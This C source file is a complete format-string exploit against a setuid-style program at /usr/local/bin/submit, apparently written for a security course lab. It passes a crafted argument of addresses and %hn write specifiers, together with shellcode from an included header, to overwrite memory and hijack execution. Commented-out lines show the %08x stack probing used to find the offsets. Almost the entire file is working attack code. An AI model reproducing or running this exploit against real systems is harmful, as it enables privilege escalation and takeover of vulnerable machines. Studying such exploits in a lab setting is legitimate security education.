#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  char *args[] = { "",

                   "\x0e\xde\xbf\xff\x0c\xde\xbf\xff "
                   "%106$ 57263x"
                   "%107$hn"
                   "%107$ 8199x"
                   "%106$hn ",

                   shellcode,
                   NULL };

  char *env[] = { NULL };

  /*
  args[1] = "DDDD..%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x ";


  //args[1] = "DDDD%107$x";


  // ffbfdfb8 : 0x895e1feb (shellcode)

  args[2] = shellcode;
  args[3] = NULL;
  */

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");
  
  exit(0);
}
